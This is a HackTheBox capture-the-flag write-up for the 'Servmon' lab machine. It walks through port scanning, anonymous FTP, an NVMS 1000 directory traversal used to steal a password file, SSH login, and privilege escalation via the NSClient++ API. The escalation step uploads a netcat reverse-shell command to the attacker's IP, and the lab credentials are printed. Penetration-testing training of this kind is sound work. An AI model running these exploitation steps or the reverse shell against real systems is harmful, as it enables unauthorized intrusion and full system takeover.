---
title: "Servmon - HackTheBox"
date: 2020-06-20T17:00:00+02:00
tags: []
---

Let's start with a port scan:
```
$ nmap -A -T4 10.10.10.184
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-20 14:49 UTC
Warning: 10.10.10.184 giving up on port because retransmission cap hit (6).
Stats: 0:02:16 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 77.78% done; ETC: 14:52 (0:00:28 remaining)
Nmap scan report for 10.10.10.184
Host is up (0.057s latency).
Not shown: 874 closed ports, 117 filtered ports
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_01-18-20  12:05PM       <DIR>          Users
| ftp-syst:
|_  SYST: Windows_NT
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey:
|   2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA)
|   256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA)
|_  256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519)
80/tcp   open  http
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 404 Not Found
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|     AuthInfo:
|   GetRequest, HTTPOptions, RTSPRequest:
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo:
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|_    </html>
|_http-title: Site doesn't have a title (text/html).
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5666/tcp open  tcpwrapped
6699/tcp open  napster?
8443/tcp open  ssl/https-alt
| fingerprint-strings:
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions:
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest:
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|_    2585
| http-title: NSClient++
|_Requested resource was /index.html
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
|_ssl-date: TLS randomness does not represent time
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.80%I=7%D=6/20%Time=5EEE223E%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\nCon
SF:tent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n\xe
SF:f\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0\
SF:x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-tra
SF:nsitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1999/xhtm
SF:l\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20\x20<s
SF:cript\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x20\x20w
SF:indow\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\x20
SF:</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r(HTTPOption
SF:s,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\nContent-
SF:Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n\xef\xbb
SF:\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0\x20Tr
SF:ansitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-transiti
SF:onal\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1999/xhtml\">\
SF:r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20\x20<script
SF:\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x20\x20window
SF:\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\x20</scr
SF:ipt>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r(RTSPRequest,1B4
SF:,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\nContent-Lengt
SF:h:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n\xef\xbb\xbf<
SF:!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0\x20Transit
SF:ional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-transitional\
SF:.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1999/xhtml\">\r\n<h
SF:ead>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20\x20<script\x20t
SF:ype=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x20\x20window\.loc
SF:ation\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\x20</script>\
SF:r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r(FourOhFourRequest,65
SF:,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-type:\x20text/html\r\nCon
SF:tent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8443-TCP:V=7.80%T=SSL%I=7%D=6/20%Time=5EEE2243%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,122,"HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLocatio
SF:n:\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\x002585\0\0\0\0\0\0\0\0\0\
SF:0\0\0\0\0\0\0s\0d\0a\0y\0:\0T\0h\0u\0:\0T\0h\0u\0r\0s\0d\0a\0y\0:\0F\0r
SF:\0i\0:\0F\0r\0i\0d\0a\0y\0:\0S\0a\0t\0:\0S\0a\0t\0u\0r\0d\0a\0y\0\0\0\0
SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
SF:0\0\0\0\0\0\0\0\0to")%r(HTTPOptions,36,"HTTP/1\.1\x20404\r\nContent-Len
SF:gth:\x2018\r\n\r\nDocument\x20not\x20found")%r(FourOhFourRequest,36,"HT
SF:TP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x20found
SF:")%r(RTSPRequest,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nD
SF:ocument\x20not\x20found")%r(SIPOptions,36,"HTTP/1\.1\x20404\r\nContent-
SF:Length:\x2018\r\n\r\nDocument\x20not\x20found");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 1m34s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-06-20T14:54:35
|_  start_date: N/A
```

There's a FTP server running on port 21, a SSH server on port 22 (unusual for
windows machines) and a HTTP server on port 80. Let's start from the FTP server:
![](/images/hackthebox/servmon/ftp.png)

Navigating inside `Users` we can find two files. Here's the content of
`Nadine/Confidential.txt`:
```
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine
```

And the content of `Nathan/Notes to do.txt`:
```
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
```

Let's keep this stuff in mind. The HTTP server shows us a login and there's not
much that we can do:
![](/images/hackthebox/servmon/http.png)

Searchsploit reveals some path traversal exploits for `nvms`:
```
$ searchsploit nvms
------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                              |  Path
------------------------------------------------------------------------------------------------------------ ---------------------------------
NVMS 1000 - Directory Traversal                                                                             | hardware/webapps/47774.txt
OpenVms 5.3/6.2/7.x - UCX POP Server Arbitrary File Modification                                            | multiple/local/21856.txt
OpenVms 8.3 Finger Service - Stack Buffer Overflow                                                          | multiple/dos/32193.txt
TVT NVMS 1000 - Directory Traversal                                                                         | hardware/webapps/48311.py
------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

I couldn't get any to work tho, because the python library `requests` removes
the dots from the url, but luckily there's an exploit in metasploit. Let's use
it:
![](/images/hackthebox/servmon/exploit.png)

Let's read the file that metasploit downloaded:
```
$ cat ~/.msf4/loot/20200620132830_default_10.10.10.184_nvms.traversal_215539.txt
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

It works! Now we can use it do download the file contaning the passwords in
Nathan's home.
Let's change the option to `set FILEPATH /Users/Nathan/Desktop/Passwords.txt`,
and let's read the file:
```
$ cat ~/.msf4/loot/20200620133131_default_10.10.10.184_nvms.traversal_704303.txt
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```

Using [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) we can try to
bruteforce smb:
![](/images/hackthebox/servmon/cme.png)

Trying to login in with `smbclient` doesn't give us acces to anything, but
remember the ssh server? Let's try the password against it!
```
$ ssh nadine@10.10.10.184
The authenticity of host '10.10.10.184 (10.10.10.184)' can't be established.
ECDSA key fingerprint is SHA256:l00hI7FlitUwW9ndgFDHLzImSDNxQcjLOKxQPRmbzls.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.184' (ECDSA) to the list of known hosts.
nadine@10.10.10.184's password:
Microsoft Windows [Version 10.0.18363.752]
(c) 2019 Microsoft Corporation. All rights reserved.

nadine@SERVMON C:\Users\Nadine>
```

Let's search for user flag:
```
nadine@SERVMON C:\Users\Nadine\Desktop>icacls user.txt
user.txt SERVMON\Administrator:(F)
         SERVMON\Nadine:(RX)

Successfully processed 1 files; Failed processing 0 files
```

# Privilege escalation

One thing that we did not investigate is the HTTP server on port 8443, let's
visit it:
![](/images/hackthebox/servmon/nsclient.png)

There's an [exploit](https://www.exploit-db.com/exploits/46802) for NSClient++
that leverages on the fact that it's running as Administrator, and we can
schedule scripts execution.

We can read the admin password in `C:\Program Files\NSClient++\nsclient.ini`:
```
; Undocumented key
password = ew2x6SsGTxjRwXOT
```

But we are not allowed to login from any host, because of this line in the
configuration file:
```
; Undocumented key
allowed hosts = 127.0.0.1
```

Luckily there's an [API](https://docs.nsclient.org/api/) that we can use from
the SSH sesssion.

After copying a netcat executable with `scp`, let's add a script to NSClient
with:
```
nadine@SERVMON C:\Users\Nadine>curl -s -k -u admin -X PUT https://localhost:8443/api/v1/scripts/ext/scripts/hack.bat --data-binary "C:\Temp\nc.exe 10.10.14.81 1337 -e cmd.exe"
Enter host password for user 'admin':
Added hack as scripts\hack.bat
```

Let's start a netcat listener on our machine and trigger the execution of the
script with:
```
nadine@SERVMON C:\Users\Nadine>curl -s -k -u admin https://localhost:8443/api/v1/queries/hack/commands/execute?time=1m
```

Let's take a look at the listner:
```
$ nc -lnvp 1337
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 172.17.0.1.
Ncat: Connection from 172.17.0.1:48222.
Microsoft Windows [Version 10.0.18363.752]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Program Files\NSClient++>
```

Let's check the user that the shell is running on:
```
C:\Program Files\NSClient++>whoami
nt authority\system
```

That's it! Thanks for reading!
